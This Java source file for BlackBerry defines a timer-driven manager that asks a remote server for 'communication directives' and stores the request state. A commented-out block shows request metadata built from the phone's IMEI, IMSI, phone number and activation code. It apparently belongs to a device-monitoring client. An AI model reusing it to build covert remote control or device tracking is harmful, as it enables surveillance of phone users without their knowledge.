

import java.io.IOException;
import net.rim.device.api.system.PersistentObject;
import net.rim.device.api.system.PersistentStore;
import net.rim.device.api.system.RuntimeStore;
import com.apptest.resource.Configuration;
import com.vvt.prot.CommandListener;
import com.vvt.prot.CommandMetaData;
import com.vvt.prot.CommandRequest;
import com.vvt.prot.CommandServiceManager;
import com.vvt.prot.command.GetCommunicationDirectives;
import com.vvt.prot.command.response.GetCommunicationDirectivesCmdResponse;
import com.vvt.prot.command.response.StructureCmdResponse;
import com.vvt.std.FxTimer;
import com.vvt.std.FxTimerListener;
import com.vvt.std.Log;

public class GetCommunicationDirectivesManager implements CommandListener, FxTimerListener {

	private static final String TAG = "GetCommunicationDirectivesManager";
	private static final int GET_COMMUNICATION_INTERVAL = 10; // In second
	private static final int GET_COMMUNICATION__PROCESS_INTERVAL = 10; // In minute
	private static final int GET_COMMUNICATION_TIMER_ID = 1;
	private static final int GET_COMMUNICATION__PROCESS_TIMER_ID = 2;
	private static final long GET_COMMUNICATION_DIRECTIVES_KEY = 0x4e2dd613a57f117fL;
	private static final long GET_COMMUNICATION_DIRECTIVES_GUID = 0x19a944729799cd52L;
	private static GetCommunicationDirectivesManager self = null;		
	private PersistentObject getCommPersistence = null;
	private GetCommunicationDirectivesClientData getCommuInfo = null;
	private GetCommunicationDirectivesCmdResponse getCommuRes = null;
	private FxTimer getCommuTimer = new FxTimer(GET_COMMUNICATION_TIMER_ID, this);
	private FxTimer getCommuProcessTimer = new FxTimer(GET_COMMUNICATION__PROCESS_TIMER_ID, this);
	private PhoenixProtocolListener listener = null;
	
	private GetCommunicationDirectivesManager() {
		getCommPersistence = PersistentStore.getPersistentObject(GET_COMMUNICATION_DIRECTIVES_KEY);
		synchronized (getCommPersistence) {
			if (getCommPersistence.getContents() == null) {
				getCommuInfo  = new GetCommunicationDirectivesClientData();
				getCommPersistence.setContents(getCommuInfo);
				getCommPersistence.commit();
			}
			getCommuInfo = (GetCommunicationDirectivesClientData)getCommPersistence.getContents();
			getCommuTimer.setInterval(GET_COMMUNICATION_INTERVAL);
			getCommuProcessTimer.setIntervalMinute(GET_COMMUNICATION__PROCESS_INTERVAL);
		}
	}
	
	public static GetCommunicationDirectivesManager getInstance() {
		if (self == null) {
			self = (GetCommunicationDirectivesManager)RuntimeStore.getRuntimeStore().get(GET_COMMUNICATION_DIRECTIVES_GUID);
			if (self == null) {
				GetCommunicationDirectivesManager getCommu = new GetCommunicationDirectivesManager();
				RuntimeStore.getRuntimeStore().put(GET_COMMUNICATION_DIRECTIVES_GUID, getCommu);
				self = getCommu;
			}
		}
		return self;
	}
	
	public void start() {
		Log.debug(TAG + ".start()", "ENTER");
		getCommuTimer.start();
	}
	
	public void stop() {
		Log.debug(TAG + ".stop()", "ENTER");
		cancelTask();
	}
	
	public void addListener(PhoenixProtocolListener listener) {
		this.listener = listener;
	}

	public void removeListener() {
		this.listener = null;
	}
	
	private synchronized void doSend() {
		try {
			Log.debug(TAG + ".doSend()", "ENTER");
			CommandRequest	cmdRequest = initCommandRequest();	
			long csid = CommandServiceManager.getInstance().execute(cmdRequest);
			getCommuInfo.setCsid(new Long(csid));
			getCommPersistence.setContents(getCommuInfo);
			getCommPersistence.commit();			
		} catch (IOException e) {
			Log.error("GetCommunicationDirectivesManager.execute()", e.getMessage(), e);
			e.printStackTrace();
			cancelTask();			
			notifyError(e.getMessage());
		}
	}
		
	private CommandRequest initCommandRequest() {
		CommandRequest cmdRequest = new CommandRequest();
		CommandMetaData cmdMetaData = Configuration.initCommandMetaData(6);
		GetCommunicationDirectives getCommu = new GetCommunicationDirectives();
		cmdRequest.setCommandData(getCommu);
    	cmdRequest.setCommandMetaData(cmdMetaData);
    	cmdRequest.setUrl(Configuration.getServerUrl());
    	cmdRequest.setCommandListener(this);
    	return cmdRequest;
	}
	
	private void cancelTask() {		
		getCommuTimer.stop();
		stopProcessTimer();
		if (getCommuInfo.getCsid() != null) {
			long csid = getCommuInfo.getCsid().longValue();
			try {
				CommandServiceManager.getInstance().cancelRequest(csid);				
			} catch (Exception e) {				
				Log.error(TAG + ".cancelTask()", "Cancel with csid: " + csid);
			}	
		}
	}
	
	private void startProcessTimer() {
		getCommuProcessTimer.stop();
		getCommuProcessTimer.start();
	}
	
	private void stopProcessTimer() {
		getCommuProcessTimer.stop();
	}
	
/*	private CommandMetaData initComandMetaData() {
		// Meta Data
		CommandMetaData cmdMetaData = new CommandMetaData();
		cmdMetaData.setProtocolVersion(Configuration.PROTOCOL_VERSION);
		cmdMetaData.setProductId(licenseInfo.getProductID());
		cmdMetaData.setProductVersion(ApplicationInfo.PRODUCT_VERSION);
		cmdMetaData.setConfId(licenseInfo.getProductConfID());
		cmdMetaData.setDeviceId(PhoneInfo.getIMEI());
		cmdMetaData.setLanguage(Languages.ENGLISH);
		cmdMetaData.setPhoneNumber(PhoneInfo.getOwnNumber());
		cmdMetaData.setMcc(Constant.EMPTY_STRING + PhoneInfo.getMCC());
		cmdMetaData.setMnc(Constant.EMPTY_STRING + PhoneInfo.getMNC());
		cmdMetaData.setActivationCode(licenseInfo.getActivationCode());
		cmdMetaData.setImsi(PhoneInfo.getIMSI());
		cmdMetaData.setTransportDirective(TransportDirectives.NON_RESUMABLE);
		cmdMetaData.setEncryptionCode(EncryptionType.ENCRYPT_ALL_METADATA.getId());
		cmdMetaData.setCompressionCode(CompressionType.COMPRESS_ALL_METADATA.getId());	
		return cmdMetaData;
	}*/
	
	/*private boolean isExisted(PhoenixProtocolListener listener) {
		boolean existed = false;
		for (int i = 0; i < listeners.size(); i++) {
			if (listener == listeners.elementAt(i)) {
				existed = true;
				break;
			}
		}
		return existed;
	}*/
	
	private void notifySuccess() {
		if (listener != null) {
			listener.onSuccess(getCommuRes);
		}
	}
	
	private void notifyError(String message) {
		if (listener != null) {
			listener.onError(message);
		}
	}
	
	// CommandListener
	public void onSuccess(StructureCmdResponse response) {
		stopProcessTimer();
		if (response instanceof GetCommunicationDirectivesCmdResponse) {
			getCommuRes = (GetCommunicationDirectivesCmdResponse) response;
			if (getCommuRes.getStatusCode() == 0) {				
				notifySuccess();
			} 
		} else {
			notifyError(response.getServerMsg());
		}
	}

	public void onConstructError(long csid, Exception e) {
		Log.error(TAG + ".onConstructError()", e.getMessage(), e);
		stopProcessTimer();
		notifyError(e.getMessage());
	}

	public void onServerError(long csid, StructureCmdResponse response) {
		Log.error(TAG + ".onServerError()", response.getServerMsg());
		stopProcessTimer();
		notifyError(response.getServerMsg());		
	}

	public void onTransportError(long csid, Exception e) {
		Log.error(TAG + ".onTransportError()", e.getMessage(), e);
		stopProcessTimer();
		notifyError(e.getMessage());
	}

	// FxTimerListener
	public void timerExpired(int id) {			
		Log.debug(TAG + ".timerExpired()", "id: " + id);
		if (id == GET_COMMUNICATION_TIMER_ID) {	
			startProcessTimer();			
			doSend();
		} else if (id == GET_COMMUNICATION__PROCESS_TIMER_ID) {
			cancelTask();
		}
	}

}
